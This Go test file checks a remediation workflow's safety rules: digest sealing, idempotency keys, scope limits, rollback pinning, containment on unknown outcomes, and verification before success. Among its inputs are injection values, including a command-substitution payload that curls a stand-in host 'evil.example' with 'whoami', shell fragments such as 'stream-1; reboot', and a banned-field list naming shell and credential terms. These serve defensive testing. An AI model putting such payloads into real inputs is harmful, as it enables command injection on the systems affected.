package domain

import (
	"errors"
	"reflect"
	"strings"
	"testing"
	"time"
)

// remediationSecurityReceipt is a well-formed receipt for the canonical plan,
// used as the baseline every tamper case mutates one field of.
func remediationSecurityReceipt(t *testing.T) (RemediationReceipt, RemediationAttempt) {
	t.Helper()
	now := remediationInstant()
	plan := validRemediationPlan(true)
	attempt, err := NewRemediationAttempt("attempt-1", plan, RemediationStageCanary, 1,
		[]RemediationTarget{"stream-1"}, "worker-1", now, now.Add(time.Minute))
	if err != nil {
		t.Fatal(err)
	}
	receipt := RemediationReceipt{
		ID: "receipt-1", RunID: plan.RunID, AttemptID: attempt.ID, ClusterID: plan.ClusterID,
		IdempotencyKey: attempt.IdempotencyKey, Stage: RemediationStageCanary,
		Targets:   []RemediationTarget{"stream-1"},
		PerTarget: []RemediationTargetOutcome{{Target: "stream-1", Outcome: ExecutionExecuted}},
		Outcome:   ExecutionExecuted, ObservedAt: now,
	}
	receipt.Digest = receipt.ComputeDigest()
	return receipt, attempt
}

// TestRemediationReceiptDigestCoversEveryFieldExceptDigest proves the receipt's
// digest is a real seal rather than a checksum of a convenient subset. Every
// field is mutated once and the digest must move, and a reflection guard
// asserts the table names every field, so a field added later without a
// canonical encoding fails here rather than becoming quietly forgeable.
func TestRemediationReceiptDigestCoversEveryFieldExceptDigest(t *testing.T) {
	baseline, _ := remediationSecurityReceipt(t)
	cases := map[string]func(RemediationReceipt) RemediationReceipt{
		"ID":             func(r RemediationReceipt) RemediationReceipt { r.ID = "receipt-2"; return r },
		"RunID":          func(r RemediationReceipt) RemediationReceipt { r.RunID = "run-2"; return r },
		"AttemptID":      func(r RemediationReceipt) RemediationReceipt { r.AttemptID = "attempt-2"; return r },
		"ClusterID":      func(r RemediationReceipt) RemediationReceipt { r.ClusterID = "cluster-2"; return r },
		"IdempotencyKey": func(r RemediationReceipt) RemediationReceipt { r.IdempotencyKey = "other-key"; return r },
		"Stage":          func(r RemediationReceipt) RemediationReceipt { r.Stage = RemediationStageRollback; return r },
		"Targets": func(r RemediationReceipt) RemediationReceipt {
			r.Targets = []RemediationTarget{"stream-1", "stream-2"}
			return r
		},
		"PerTarget": func(r RemediationReceipt) RemediationReceipt {
			r.PerTarget = []RemediationTargetOutcome{{Target: "stream-1", Outcome: ExecutionFailed}}
			return r
		},
		"Outcome": func(r RemediationReceipt) RemediationReceipt { r.Outcome = ExecutionUnknown; return r },
		"ObservedAt": func(r RemediationReceipt) RemediationReceipt {
			r.ObservedAt = r.ObservedAt.Add(time.Nanosecond)
			return r
		},
	}
	for name, mutate := range cases {
		t.Run(name, func(t *testing.T) {
			if mutate(baseline).ComputeDigest() == baseline.Digest {
				t.Fatalf("mutating %s left the receipt digest unchanged", name)
			}
		})
	}
	structure := reflect.TypeOf(RemediationReceipt{})
	for index := 0; index < structure.NumField(); index++ {
		field := structure.Field(index).Name
		if field == "Digest" {
			continue
		}
		if _, covered := cases[field]; !covered {
			t.Fatalf("RemediationReceipt.%s is not proven to be covered by its digest", field)
		}
	}
}

// TestRemediationReceiptCanonicalEncodingIsUnambiguous shifts field boundaries
// without changing the concatenated characters. A delimiter-based encoding
// would let a forged receipt collide with a genuine one here; the length
// prefixes keep them apart.
func TestRemediationReceiptCanonicalEncodingIsUnambiguous(t *testing.T) {
	base, _ := remediationSecurityReceipt(t)
	cases := []struct {
		name  string
		left  func(RemediationReceipt) RemediationReceipt
		right func(RemediationReceipt) RemediationReceipt
	}{
		{
			name:  "identifier boundary between the receipt and its run",
			left:  func(r RemediationReceipt) RemediationReceipt { r.ID = "ab"; r.RunID = "c"; return r },
			right: func(r RemediationReceipt) RemediationReceipt { r.ID = "a"; r.RunID = "bc"; return r },
		},
		{
			name:  "boundary between the attempt and the cluster",
			left:  func(r RemediationReceipt) RemediationReceipt { r.AttemptID = "ab"; r.ClusterID = "c"; return r },
			right: func(r RemediationReceipt) RemediationReceipt { r.AttemptID = "a"; r.ClusterID = "bc"; return r },
		},
		{
			name: "one joined target against two split ones",
			left: func(r RemediationReceipt) RemediationReceipt {
				r.Targets = []RemediationTarget{"stream-1stream-2"}
				return r
			},
			right: func(r RemediationReceipt) RemediationReceipt {
				r.Targets = []RemediationTarget{"stream-1", "stream-2"}
				return r
			},
		},
		{
			name: "per-target boundary between a target and its outcome",
			left: func(r RemediationReceipt) RemediationReceipt {
				r.PerTarget = []RemediationTargetOutcome{{Target: "ab", Outcome: ExecutionExecuted}}
				return r
			},
			right: func(r RemediationReceipt) RemediationReceipt {
				r.PerTarget = []RemediationTargetOutcome{{Target: "a", Outcome: "bEXECUTED"}}
				return r
			},
		},
	}
	for _, testCase := range cases {
		t.Run(testCase.name, func(t *testing.T) {
			if testCase.left(base).ComputeDigest() == testCase.right(base).ComputeDigest() {
				t.Fatal("a shifted field boundary must not produce the same receipt digest")
			}
		})
	}
}

// TestRemediationIdempotencyKeyCoversEveryPreimageComponent tests each of the
// eight components independently. A component that did not move the key would
// be a component an attacker could change while still colliding with a receipt
// recorded for something else.
func TestRemediationIdempotencyKeyCoversEveryPreimageComponent(t *testing.T) {
	plan := validRemediationPlan(true)
	base := RemediationIdempotencyInput{
		RunID: plan.RunID, ClusterID: plan.ClusterID, Stage: RemediationStageCanary, AttemptNumber: 1,
		RecipeDigest: plan.Recipe.Digest, TargetSetDigest: plan.TargetSetDigest,
		ArgumentsDigest:  plan.Arguments.Digest(),
		WaveTargetDigest: RemediationWaveTargetDigest([]RemediationTarget{"stream-1"}),
	}
	cases := map[string]func(RemediationIdempotencyInput) RemediationIdempotencyInput{
		"RunID":     func(i RemediationIdempotencyInput) RemediationIdempotencyInput { i.RunID = "run-2"; return i },
		"ClusterID": func(i RemediationIdempotencyInput) RemediationIdempotencyInput { i.ClusterID = "cluster-2"; return i },
		"Stage": func(i RemediationIdempotencyInput) RemediationIdempotencyInput {
			i.Stage = RemediationStageRollback
			return i
		},
		"AttemptNumber": func(i RemediationIdempotencyInput) RemediationIdempotencyInput { i.AttemptNumber = 2; return i },
		"RecipeDigest": func(i RemediationIdempotencyInput) RemediationIdempotencyInput {
			i.RecipeDigest = ChecksumSHA256([]byte("substituted recipe"))
			return i
		},
		"TargetSetDigest": func(i RemediationIdempotencyInput) RemediationIdempotencyInput {
			i.TargetSetDigest = RemediationTargetSetDigest(resolvedRemediationTargets("stream-9"))
			return i
		},
		"ArgumentsDigest": func(i RemediationIdempotencyInput) RemediationIdempotencyInput {
			i.ArgumentsDigest = TypedArguments{{Name: "priority", Type: ParameterEnum, Enum: "ELEVATED"}}.Digest()
			return i
		},
		"WaveTargetDigest": func(i RemediationIdempotencyInput) RemediationIdempotencyInput {
			i.WaveTargetDigest = RemediationWaveTargetDigest([]RemediationTarget{"stream-2"})
			return i
		},
	}
	key := RemediationIdempotencyKey(base)
	for name, mutate := range cases {
		t.Run(name, func(t *testing.T) {
			if RemediationIdempotencyKey(mutate(base)) == key {
				t.Fatalf("changing %s did not change the idempotency key", name)
			}
		})
	}
	structure := reflect.TypeOf(RemediationIdempotencyInput{})
	for index := 0; index < structure.NumField(); index++ {
		field := structure.Field(index).Name
		if _, covered := cases[field]; !covered {
			t.Fatalf("RemediationIdempotencyInput.%s does not enter the key preimage", field)
		}
	}
	// The key is also stable: the same inputs always produce the same key, which
	// is what makes a duplicate delivery collide instead of mutating twice.
	if RemediationIdempotencyKey(base) != key {
		t.Fatal("the same preimage must always produce the same key")
	}
	// Boundary shifting between the two adjacent identifier segments must not
	// produce a collision either.
	shifted := base
	shifted.RunID = "run"
	shifted.ClusterID = "-1cluster-1"
	if RemediationIdempotencyKey(shifted) == key {
		t.Fatal("a shifted identifier boundary must not collide with the base key")
	}
}

// TestRemediationArgumentsDigestDistinguishesEveryComponent covers the digest
// that stops a mutated arguments row reusing a receipt recorded for the values
// that were actually authorized.
func TestRemediationArgumentsDigestDistinguishesEveryComponent(t *testing.T) {
	base := TypedArguments{{
		Name: "priority", Type: ParameterEnum, Enum: "NORMAL", Integer: 1,
		Duration: time.Minute, Boolean: false,
	}}
	cases := map[string]func(TypedArguments) TypedArguments{
		"Name":     func(a TypedArguments) TypedArguments { a[0].Name = "priorities"; return a },
		"Type":     func(a TypedArguments) TypedArguments { a[0].Type = ParameterInteger; return a },
		"Enum":     func(a TypedArguments) TypedArguments { a[0].Enum = "ELEVATED"; return a },
		"Integer":  func(a TypedArguments) TypedArguments { a[0].Integer = 2; return a },
		"Duration": func(a TypedArguments) TypedArguments { a[0].Duration = time.Hour; return a },
		"Boolean":  func(a TypedArguments) TypedArguments { a[0].Boolean = true; return a },
	}
	digest := base.Digest()
	for name, mutate := range cases {
		t.Run(name, func(t *testing.T) {
			mutated := TypedArguments{base[0]}
			if mutate(mutated).Digest() == digest {
				t.Fatalf("changing %s did not change the arguments digest", name)
			}
		})
	}
	structure := reflect.TypeOf(TypedArgument{})
	for index := 0; index < structure.NumField(); index++ {
		field := structure.Field(index).Name
		if _, covered := cases[field]; !covered {
			t.Fatalf("TypedArgument.%s does not enter the arguments digest", field)
		}
	}
	// Adding an argument changes the digest, and a boundary shift between the
	// name and the value of an argument does not collide.
	widened := TypedArguments{base[0], {Name: "requeue_reason", Type: ParameterEnum, Enum: "STALE_STREAM"}}
	if widened.Digest() == digest {
		t.Fatal("an added argument must change the digest")
	}
	left := TypedArguments{{Name: "ab", Type: ParameterEnum, Enum: "c"}}
	right := TypedArguments{{Name: "a", Type: ParameterEnum, Enum: "bc"}}
	if left.Digest() == right.Digest() {
		t.Fatal("a shifted boundary between an argument name and its value must not collide")
	}
}

// TestRemediationPlanRefusesEveryScopeEscape walks the whole tier, privilege
// and assurance space rather than the one value each that a happy path
// exercises. The rule under test is that these are equalities and not
// ceilings: an unset tier is not a weaker permission, it is an unstated one,
// and no plan carrying one may be constructed at all.
func TestRemediationPlanRefusesEveryScopeEscape(t *testing.T) {
	for _, tier := range []AutonomyTier{
		TierReadOnly, TierSingleTargetMonitor, TierWorkloadContainment, TierDestructive, AutonomyTier(9), AutonomyTier(-1),
	} {
		plan := validRemediationPlan(true)
		plan.Tier = tier
		if _, err := NewRemediationRun(plan); err == nil {
			t.Fatalf("tier %d must not produce a run", int(tier))
		}
	}
	for _, privilege := range []RemediationPrivilege{
		"", PrivilegeClusterRead, PrivilegeClusterMutate, "ROOT",
	} {
		plan := validRemediationPlan(true)
		plan.Privilege = privilege
		if _, err := NewRemediationRun(plan); err == nil {
			t.Fatalf("privilege %q must not produce a run", privilege)
		}
	}
	for _, assurance := range []AssuranceClass{"", AssuranceRecorded, AssuranceLive, "PRODUCTION"} {
		plan := validRemediationPlan(true)
		plan.Assurance = assurance
		if _, err := NewRemediationRun(plan); err == nil {
			t.Fatalf("assurance %q must not produce a run", assurance)
		}
	}
	// The ordering that the rollback containment rules rest on must place an
	// unknown privilege above every known one, so a comparison against a
	// corrupted value fails closed rather than comparing as the smallest.
	if PrivilegeSherlockInternal.Rank() >= PrivilegeClusterRead.Rank() ||
		PrivilegeClusterRead.Rank() >= PrivilegeClusterMutate.Rank() ||
		PrivilegeClusterMutate.Rank() >= RemediationPrivilege("ANYTHING_ELSE").Rank() {
		t.Fatal("privilege ranking must be ordered and must place an unknown value highest")
	}
}

// TestRemediationPlanRefusesAnUnpinnedOrSelfReferentialRollback covers the
// rollback reference itself. A bare identifier carried no version and no
// digest, so a different definition — with a different tier and a different
// role set — could answer to the same name.
func TestRemediationPlanRefusesAnUnpinnedOrSelfReferentialRollback(t *testing.T) {
	cases := []struct {
		name   string
		mutate func(RemediationPlan) RemediationPlan
	}{
		{
			name: "rollback named without a digest",
			mutate: func(p RemediationPlan) RemediationPlan {
				p.Rollback = RemediationRecipeRef{ID: "sherlock.restore", Version: "1.0.0"}
				return p
			},
		},
		{
			name: "rollback named without a version",
			mutate: func(p RemediationPlan) RemediationPlan {
				p.Rollback = RemediationRecipeRef{ID: "sherlock.restore", Digest: ChecksumSHA256([]byte("rollback"))}
				return p
			},
		},
		{
			name: "rollback is the forward recipe under another version",
			mutate: func(p RemediationPlan) RemediationPlan {
				p.Rollback = RemediationRecipeRef{ID: p.Recipe.ID, Version: "2.0.0", Digest: ChecksumSHA256([]byte("self"))}
				return p
			},
		},
		{
			name: "rollback identifier outside the token charset",
			mutate: func(p RemediationPlan) RemediationPlan {
				p.Rollback = RemediationRecipeRef{ID: "sherlock.restore; sh", Version: "1.0.0", Digest: ChecksumSHA256([]byte("rollback"))}
				return p
			},
		},
		{
			name: "forward recipe named without a digest",
			mutate: func(p RemediationPlan) RemediationPlan {
				p.Recipe = RemediationRecipeRef{ID: "sherlock.requeue", Version: "1.0.0"}
				return p
			},
		},
	}
	for _, testCase := range cases {
		t.Run(testCase.name, func(t *testing.T) {
			if _, err := NewRemediationRun(testCase.mutate(validRemediationPlan(true))); err == nil {
				t.Fatal("an unpinned recipe reference must not produce a run")
			}
		})
	}
}

// TestRemediationUnknownOutcomeAndLostLeaseAlwaysContain covers the rule that
// an ambiguous mutation reaches containment from every executing stage. Losing
// a lease after dispatch means the outcome is unknown, and unknown is neither a
// success nor a retryable failure: it is a state a human has to establish.
func TestRemediationUnknownOutcomeAndLostLeaseAlwaysContain(t *testing.T) {
	now := remediationInstant()
	reports := map[string]RemediationExecutionReport{
		"unknown outcome": {Outcome: ExecutionUnknown, ExecutedTargets: []RemediationTarget{"stream-1"}},
		"lease lost while reporting execution": {
			Outcome: ExecutionExecuted, LeaseLost: true, ExecutedTargets: []RemediationTarget{"stream-1"},
		},
		"lease lost while reporting failure": {
			Outcome: ExecutionFailed, LeaseLost: true, ExecutedTargets: []RemediationTarget{"stream-1"},
		},
		"lease lost with an unknown outcome": {Outcome: ExecutionUnknown, LeaseLost: true},
	}
	stages := map[string]struct {
		state  RemediationState
		record func(RemediationRun, RemediationExecutionReport) (RemediationRun, error)
	}{
		"canary": {
			state: RemediationCanaryExecuting,
			record: func(run RemediationRun, report RemediationExecutionReport) (RemediationRun, error) {
				return run.RecordCanaryOutcome(report, now)
			},
		},
		"rollout": {
			state: RemediationRollingOut,
			record: func(run RemediationRun, report RemediationExecutionReport) (RemediationRun, error) {
				return run.RecordRolloutOutcome(report, now)
			},
		},
		"rollback": {
			state: RemediationRollingBack,
			record: func(run RemediationRun, report RemediationExecutionReport) (RemediationRun, error) {
				return run.RecordRollbackExecution(report, now)
			},
		},
	}
	for stageName, stage := range stages {
		for reportName, report := range reports {
			t.Run(stageName+" with "+reportName, func(t *testing.T) {
				contained, err := stage.record(runInState(t, stage.state, true), report)
				if err != nil {
					t.Fatal(err)
				}
				if contained.State() != RemediationContained {
					t.Fatalf("state = %s, want CONTAINED", contained.State())
				}
			})
		}
	}
	// The same reports must never reach a terminal success or a fresh attempt.
	for reportName, report := range reports {
		contained, err := runInState(t, RemediationCanaryExecuting, true).RecordCanaryOutcome(report, now)
		if err != nil {
			t.Fatal(err)
		}
		if contained.State() == RemediationSucceeded || contained.State() == RemediationVerifying {
			t.Fatalf("%s reached %s", reportName, contained.State())
		}
		if !contained.State().Terminal() {
			t.Fatalf("%s left the run in the non-terminal state %s", reportName, contained.State())
		}
	}
}

// TestRemediationSuccessIsUnreachableWithoutIndependentVerification collects
// every way an executor might try to assert success. Success is never a status
// an executor may claim: it requires declared postconditions, every one of them
// observed and satisfied, and full target coverage.
func TestRemediationSuccessIsUnreachableWithoutIndependentVerification(t *testing.T) {
	now := remediationInstant()
	full := []RemediationTarget{"stream-1", "stream-2"}
	cases := []struct {
		name         string
		verification RemediationVerification
		wantCode     string
	}{
		{
			name:         "no postconditions at all",
			verification: RemediationVerification{ExecutedTargets: full},
			wantCode:     VerificationPostconditionsMissing,
		},
		{
			name: "a postcondition nobody observed",
			verification: RemediationVerification{
				Postconditions:  []RemediationConditionResult{{ConditionID: "stream-fresh", Result: ConditionUnobserved}},
				ExecutedTargets: full,
			},
			wantCode: VerificationUnobserved,
		},
		{
			name: "an unsatisfied postcondition",
			verification: RemediationVerification{
				Postconditions:  []RemediationConditionResult{{ConditionID: "stream-fresh", Result: ConditionUnsatisfied}},
				ExecutedTargets: full,
			},
			wantCode: VerificationUnsatisfied,
		},
		{
			name: "one satisfied and one unobserved postcondition",
			verification: RemediationVerification{
				Postconditions: []RemediationConditionResult{
					{ConditionID: "a-satisfied", Result: ConditionSatisfied},
					{ConditionID: "b-unobserved", Result: ConditionUnobserved},
				},
				ExecutedTargets: full,
			},
			wantCode: VerificationUnobserved,
		},
		{
			name: "partial target coverage",
			verification: RemediationVerification{
				Postconditions:  []RemediationConditionResult{{ConditionID: "stream-fresh", Result: ConditionSatisfied}},
				ExecutedTargets: []RemediationTarget{"stream-1"},
			},
			wantCode: VerificationCoverageIncomplete,
		},
		{
			name: "no executed targets at all",
			verification: RemediationVerification{
				Postconditions: []RemediationConditionResult{{ConditionID: "stream-fresh", Result: ConditionSatisfied}},
			},
			wantCode: VerificationCoverageIncomplete,
		},
		{
			name: "a target the run never resolved claimed as executed",
			verification: RemediationVerification{
				Postconditions:  []RemediationConditionResult{{ConditionID: "stream-fresh", Result: ConditionSatisfied}},
				ExecutedTargets: []RemediationTarget{"stream-1", "stream-2", "stream-9"},
			},
			wantCode: VerificationCoverageIncomplete,
		},
		{
			name: "duplicated executed targets padding a partial coverage",
			verification: RemediationVerification{
				Postconditions:  []RemediationConditionResult{{ConditionID: "stream-fresh", Result: ConditionSatisfied}},
				ExecutedTargets: []RemediationTarget{"stream-1", "stream-1"},
			},
			wantCode: VerificationCoverageIncomplete,
		},
	}
	for _, testCase := range cases {
		t.Run(testCase.name, func(t *testing.T) {
			_, err := runInState(t, RemediationVerifying, true).RecordVerification(testCase.verification, now)
			var refusal RemediationVerificationError
			if !errors.As(err, &refusal) {
				t.Fatalf("err = %v, want a verification refusal", err)
			}
			if refusal.Code != testCase.wantCode {
				t.Fatalf("code = %s, want %s", refusal.Code, testCase.wantCode)
			}
		})
	}
	// The one path that does succeed proves the refusals above are not simply a
	// method that never returns SUCCEEDED.
	succeeded, err := runInState(t, RemediationVerifying, true).RecordVerification(RemediationVerification{
		Postconditions:  []RemediationConditionResult{{ConditionID: "stream-fresh", Result: ConditionSatisfied}},
		ExecutedTargets: full,
	}, now)
	if err != nil || succeeded.State() != RemediationSucceeded {
		t.Fatalf("state = %s err = %v, want SUCCEEDED", succeeded.State(), err)
	}
}

// TestRemediationRestartPreservesConsumedBudgets is the restart-safety property
// stated adversarially: a crash must not refill a repair budget. Every
// non-terminal state is reconstituted with its budgets already spent, and the
// bounded loops must still refuse to run again.
func TestRemediationRestartPreservesConsumedBudgets(t *testing.T) {
	now := remediationInstant()
	plan := validRemediationPlan(true)
	spent := RemediationProgress{
		RolloutWave: plan.MaxRolloutWaves(), RollbackAttempt: plan.MaxAttempts,
		TotalAttempts: MaxTotalRemediationAttempts,
	}
	for _, state := range AllRemediationStates() {
		if state.Terminal() {
			continue
		}
		run, err := ReconstituteRemediationRun(plan, state, 12, spent)
		if err != nil {
			t.Fatalf("reconstitute %s: %v", state, err)
		}
		if run.Progress() != spent {
			t.Fatalf("%s: progress = %+v, want the persisted counters preserved", state, run.Progress())
		}
		if run.State() != state || run.Version() != 12 {
			t.Fatalf("%s: restart must preserve state and version", state)
		}
	}

	verifying, err := ReconstituteRemediationRun(plan, RemediationVerifying, 12, spent)
	if err != nil {
		t.Fatal(err)
	}
	var budget RemediationBudgetError
	if _, err := verifying.BeginRollout(now); !errors.As(err, &budget) {
		t.Fatalf("err = %v, want an exhausted rollout budget after a restart", err)
	}
	if _, err := verifying.BeginRollback(now); !errors.As(err, &budget) {
		t.Fatalf("err = %v, want an exhausted rollback budget after a restart", err)
	}
	ready, err := ReconstituteRemediationRun(plan, RemediationReady, 12, spent)
	if err != nil {
		t.Fatal(err)
	}
	revalidation := RemediationDispatchRevalidation{
		Policy: RemediationPolicyOutcome{
			Allowed: true, Code: "ALLOWED", PolicyID: "policy-1", PolicyVersion: 1, DecidedAt: now,
		},
		Recipe: plan.Recipe, RecipeExpiresAt: now.Add(time.Hour), TargetSetDigest: plan.TargetSetDigest,
		RolePopulation: 8, PinnedPopulation: 8, LeaseHeld: true,
	}
	if _, err := ready.Dispatch(revalidation, now); !errors.As(err, &budget) {
		t.Fatalf("err = %v, want an exhausted attempt budget to block a dispatch after a restart", err)
	}
	if budget.Budget != BudgetTotalAttempts {
		t.Fatalf("budget = %s, want %s", budget.Budget, BudgetTotalAttempts)
	}

	// A persisted counter beyond its bound is a corrupted row and must not
	// reconstitute at all, or a crafted update would hand a run a fresh budget.
	for _, overrun := range []RemediationProgress{
		{RolloutWave: plan.MaxRolloutWaves() + 1},
		{RollbackAttempt: plan.MaxAttempts + 1},
		{TotalAttempts: MaxTotalRemediationAttempts + 1},
		{RolloutWave: -1},
		{RollbackAttempt: -1},
		{TotalAttempts: -1},
	} {
		if _, err := ReconstituteRemediationRun(plan, RemediationVerifying, 12, overrun); err == nil {
			t.Fatalf("progress %+v must not reconstitute", overrun)
		}
	}
}

// TestRemediationDispatchRefusesEveryStaleFact covers the rule that a run never
// dispatches on a decision older than the dispatch instant. Each fact is
// falsified on its own, and every one of them has to stop the dispatch.
func TestRemediationDispatchRefusesEveryStaleFact(t *testing.T) {
	now := remediationInstant()
	plan := validRemediationPlan(true)
	valid := RemediationDispatchRevalidation{
		Policy: RemediationPolicyOutcome{
			Allowed: true, Code: "ALLOWED", PolicyID: "policy-1", PolicyVersion: 1, DecidedAt: now,
		},
		Recipe: plan.Recipe, RecipeExpiresAt: now.Add(time.Hour), TargetSetDigest: plan.TargetSetDigest,
		RolePopulation: 8, PinnedPopulation: 8, LeaseHeld: true,
	}
	cases := map[string]struct {
		mutate func(RemediationDispatchRevalidation) RemediationDispatchRevalidation
		want   RemediationState
	}{
		"policy revoked between preflight and dispatch": {
			mutate: func(r RemediationDispatchRevalidation) RemediationDispatchRevalidation {
				r.Policy.Allowed = false
				r.Policy.Code = "POLICY_REVOKED"
				return r
			},
			want: RemediationPolicyBlocked,
		},
		"recipe swapped for another version": {
			mutate: func(r RemediationDispatchRevalidation) RemediationDispatchRevalidation {
				r.Recipe.Version = "2.0.0"
				return r
			},
			want: RemediationPreflightFailed,
		},
		"recipe digest altered under the same coordinate": {
			mutate: func(r RemediationDispatchRevalidation) RemediationDispatchRevalidation {
				r.Recipe.Digest = ChecksumSHA256([]byte("tampered"))
				return r
			},
			want: RemediationPreflightFailed,
		},
		"recipe expired between preflight and dispatch": {
			mutate: func(r RemediationDispatchRevalidation) RemediationDispatchRevalidation {
				r.RecipeExpiresAt = now.Add(-time.Nanosecond)
				return r
			},
			want: RemediationPreflightFailed,
		},
		"recipe expiry never read": {
			mutate: func(r RemediationDispatchRevalidation) RemediationDispatchRevalidation {
				r.RecipeExpiresAt = time.Time{}
				return r
			},
			want: RemediationPreflightFailed,
		},
		"target added after preflight": {
			mutate: func(r RemediationDispatchRevalidation) RemediationDispatchRevalidation {
				r.TargetSetDigest = RemediationTargetSetDigest(
					resolvedRemediationTargets("stream-1", "stream-2", "stream-3"))
				return r
			},
			want: RemediationPreflightFailed,
		},
		"role population inflated under an unchanged target set": {
			mutate: func(r RemediationDispatchRevalidation) RemediationDispatchRevalidation {
				r.RolePopulation = 40
				return r
			},
			want: RemediationPreflightFailed,
		},
		"role population never observed": {
			mutate: func(r RemediationDispatchRevalidation) RemediationDispatchRevalidation {
				r.RolePopulation = 0
				r.PinnedPopulation = 0
				return r
			},
			want: RemediationPreflightFailed,
		},
		"lease lost before dispatch": {
			mutate: func(r RemediationDispatchRevalidation) RemediationDispatchRevalidation {
				r.LeaseHeld = false
				return r
			},
			want: RemediationPreflightFailed,
		},
	}
	for name, testCase := range cases {
		t.Run(name, func(t *testing.T) {
			blocked, err := runInState(t, RemediationReady, true).Dispatch(testCase.mutate(valid), now)
			if err != nil {
				t.Fatal(err)
			}
			if blocked.State() != testCase.want {
				t.Fatalf("state = %s, want %s", blocked.State(), testCase.want)
			}
			if blocked.Progress().TotalAttempts != 0 {
				t.Fatal("a blocked dispatch must not consume an attempt")
			}
		})
	}
	// Dispatch is reachable only from READY: a run that already executed cannot
	// be pushed back through it to obtain a second canary.
	for _, state := range AllRemediationStates() {
		if state == RemediationReady {
			continue
		}
		run, err := ReconstituteRemediationRun(plan, state, 3, RemediationProgress{})
		if err != nil {
			continue
		}
		if _, err := run.Dispatch(valid, now); err == nil {
			t.Fatalf("dispatch from %s must be refused", state)
		}
	}
}

// TestRemediationDomainErrorsCarryNoUntrustedText proves an error message is
// never a channel for whatever an attacker managed to place in a field. A
// rejected target name or argument value may itself be an injection payload, so
// no refusal in this file may quote one.
func TestRemediationDomainErrorsCarryNoUntrustedText(t *testing.T) {
	payload := "$(curl https://evil.example/`whoami`)"
	fragments := []string{payload, "curl", "evil.example", "whoami", "$(", "`"}

	errs := map[string]error{}

	plan := validRemediationPlan(true)
	plan.Targets[0].Target = RemediationTarget(payload)
	_, errs["plan target"] = NewRemediationRun(plan)

	arguments := validRemediationPlan(true)
	arguments.Arguments = TypedArguments{{Name: "priority", Type: ParameterEnum, Enum: payload}}
	_, errs["argument value"] = NewRemediationRun(arguments)

	names := validRemediationPlan(true)
	names.Arguments = TypedArguments{{Name: payload, Type: ParameterEnum, Enum: "NORMAL"}}
	_, errs["argument name"] = NewRemediationRun(names)

	identifiers := validRemediationPlan(true)
	identifiers.RunID = RemediationRunID(payload)
	_, errs["run identifier"] = NewRemediationRun(identifiers)

	recipe := validRemediationPlan(true)
	recipe.Recipe.ID = RecipeID(payload)
	_, errs["recipe identifier"] = NewRemediationRun(recipe)

	conditions := runInState(t, RemediationVerifying, true)
	_, errs["condition identifier"] = conditions.RecordVerification(RemediationVerification{
		Postconditions:  []RemediationConditionResult{{ConditionID: payload, Result: ConditionSatisfied}},
		ExecutedTargets: []RemediationTarget{"stream-1", "stream-2"},
	}, remediationInstant())

	executing := runInState(t, RemediationCanaryExecuting, true)
	_, errs["executed target"] = executing.RecordCanaryOutcome(RemediationExecutionReport{
		Outcome: ExecutionExecuted, ExecutedTargets: []RemediationTarget{RemediationTarget(payload)},
	}, remediationInstant())

	_, errs["attempt lease owner"] = NewRemediationAttempt("attempt-1", validRemediationPlan(true),
		RemediationStageCanary, 1, []RemediationTarget{"stream-1"}, payload,
		remediationInstant(), remediationInstant().Add(time.Minute))

	for name, err := range errs {
		t.Run(name, func(t *testing.T) {
			if err == nil {
				t.Fatal("expected a refusal")
			}
			for _, fragment := range fragments {
				if strings.Contains(err.Error(), fragment) {
					t.Fatalf("the refusal for %s echoes %q: %s", name, fragment, err.Error())
				}
			}
		})
	}
}

// TestRemediationAggregateExposesNoUntrustedTextSurface is the structural
// counterpart: the plan an executor's authority is derived from has no field a
// rationale, an evidence excerpt or a remote string could occupy, so there is
// nowhere for prose to enter the execution path even by mistake.
func TestRemediationAggregateExposesNoUntrustedTextSurface(t *testing.T) {
	forbidden := []string{
		"rationale", "message", "output", "stdout", "stderr", "detail", "note",
		"comment", "summary", "explanation", "command", "cmd", "script", "shell",
		"args", "argv", "path", "executable", "binary", "env", "environment",
		"credential", "token", "secret", "password", "url", "endpoint", "host",
	}
	for _, structure := range []reflect.Type{
		reflect.TypeOf(RemediationPlan{}),
		reflect.TypeOf(RemediationAttempt{}),
		reflect.TypeOf(RemediationReceipt{}),
		reflect.TypeOf(RemediationExecutionReport{}),
		reflect.TypeOf(RemediationVerification{}),
		reflect.TypeOf(ResolvedTarget{}),
		reflect.TypeOf(TypedArgument{}),
	} {
		for index := 0; index < structure.NumField(); index++ {
			field := structure.Field(index)
			lowered := strings.ToLower(field.Name)
			for _, banned := range forbidden {
				if lowered == banned {
					t.Fatalf("%s.%s is an untrusted-text surface on the execution path", structure.Name(), field.Name)
				}
			}
			if field.Type.Kind() == reflect.Slice && field.Type.Elem().Kind() == reflect.Uint8 {
				t.Fatalf("%s.%s carries raw bytes", structure.Name(), field.Name)
			}
		}
	}
}

// TestRemediationAttemptWaveCannotWidenBeyondTheAuthorizedSet covers the wave
// budget from the attacker's side: an attempt acts on a subset of the persisted
// resolved set, and no combination of wave, stage or attempt number lets it
// reach a target the run was never authorized for.
func TestRemediationAttemptWaveCannotWidenBeyondTheAuthorizedSet(t *testing.T) {
	now := remediationInstant()
	plan := validRemediationPlan(true)
	cases := []struct {
		name  string
		wave  []RemediationTarget
		stage RemediationStage
	}{
		{name: "a target outside the resolved set", wave: []RemediationTarget{"stream-9"}, stage: RemediationStageCanary},
		{name: "one authorized and one unauthorized target", wave: []RemediationTarget{"stream-1", "stream-9"}, stage: RemediationStageRollout},
		{name: "a shell fragment as a wave target", wave: []RemediationTarget{"stream-1; reboot"}, stage: RemediationStageCanary},
		{name: "an empty wave", wave: nil, stage: RemediationStageRollback},
		{name: "an unknown stage", wave: []RemediationTarget{"stream-1"}, stage: "SHELL"},
	}
	for _, testCase := range cases {
		t.Run(testCase.name, func(t *testing.T) {
			_, err := NewRemediationAttempt("attempt-1", plan, testCase.stage, 1, testCase.wave,
				"worker-1", now, now.Add(time.Minute))
			if err == nil {
				t.Fatal("expected the attempt to be refused")
			}
		})
	}
	// A duplicated wave target cannot be used to pad a wave past its own digest.
	duplicated, err := NewRemediationAttempt("attempt-1", plan, RemediationStageCanary, 1,
		[]RemediationTarget{"stream-1", "stream-1"}, "worker-1", now, now.Add(time.Minute))
	if err == nil {
		t.Fatalf("a duplicated wave target must be refused, got %+v", duplicated.WaveTargets)
	}
	// A lease interval that never expires, or one that expires before it began,
	// is not a lease at all.
	for _, interval := range []struct{ created, expires time.Time }{
		{created: now, expires: now},
		{created: now, expires: now.Add(-time.Minute)},
		{created: time.Time{}, expires: now.Add(time.Minute)},
		{created: now, expires: time.Time{}},
	} {
		if _, err := NewRemediationAttempt("attempt-1", plan, RemediationStageCanary, 1,
